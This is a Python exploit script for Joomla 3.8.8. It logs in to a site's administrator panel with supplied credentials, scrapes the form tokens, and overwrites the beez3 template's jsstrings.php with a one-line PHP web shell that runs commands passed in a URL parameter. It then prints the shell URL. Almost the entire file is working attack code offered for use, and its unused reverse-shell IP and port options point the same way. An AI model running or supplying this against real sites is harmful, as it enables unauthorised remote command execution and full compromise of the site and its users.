import argparse
import requests
import sys
import lxml.html
from log_colors import *
requests.packages.urllib3.disable_warnings()

# Joomla! 3.8.8 - Template webshell generator + RCE
# Joomla! CMS version 3.8.8 is vulnerable to authenticated RCE.
class Joomla388_RCE:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, uname, password, lhost, lport):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.uname, self.password = uname, password
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    # login with creds
    def login(self):
        print (LogColors.BLUE + "login with credentials..." + LogColors.ENDC)
        data = {"username" : self.uname, "passwd" : self.password}
        r = self.session.get(self.url + "/administrator/index.php")
        if r.ok:
            print (LogColors.YELLOW + "parse hidden inputs..." + LogColors.ENDC)
            tree = lxml.html.fromstring(r.text)
            hidden = tree.xpath('.//form[@id="form-login"]//input[@type="hidden"]')
            for i in hidden:
                data[i.get("name")] = i.get("value")
        else:
            print (LogColors.RED + "failed to login :(" + LogColors.ENDC)
            sys.exit()

        r = self.session.post(self.url + "/administrator/index.php", data = data)
        if "Logout" in r.text:
            print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to login with credentials. exit" + LogColors.ENDC)
            sys.exit()

    # get shell by edit /jsstings.php
    def edit_jsstrings(self):
        print (LogColors.BLUE + "edit /jsstrings.php..." + LogColors.ENDC)
        data = {}
        r = self.session.get(self.url + "/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA=")
        if r.ok:
            print (LogColors.YELLOW + "parse hidden inputs..." + LogColors.ENDC)
            tree = lxml.html.fromstring(r.text)
            hidden = tree.xpath('.//form[@id="adminForm"]//input[@type="hidden"]')
            for i in hidden:
                data[i.get("name")] = i.get("value")
        else:
            print (LogColors.RED + "failed to edit jsstrings and get shell :(" + LogColors.ENDC)
            sys.exit()

        data["task"] = "template.apply"
        data["jform[source]"] = "<?php system($_GET['hacked']); ?>"
        try:
            r = self.session.post(self.url + "/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA=", data = data)
            if r.ok:
                print (LogColors.YELLOW +  "shell: " + self.url + "/templates/beez3/jsstrings.php?hacked=<cmd>" + LogColors.ENDC)
                print (LogColors.GREEN + "successfully get shell. hacked :)" + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "failed to get shell :(" + LogColors.ENDC)
            sys.exit()

    # exploitation logic
    def exploit(self):
        self.login()
        self.edit_jsstrings()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-U','--username', required = True, help = "auth username")
    parser.add_argument('-P','--password', required = True, help = "auth password")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    uname, pwd = args['username'], args['password']
    ip, port = args['ip'], args['port']
    cve = Joomla388_RCE(url, uname, pwd, ip, port)
    cve.exploit()

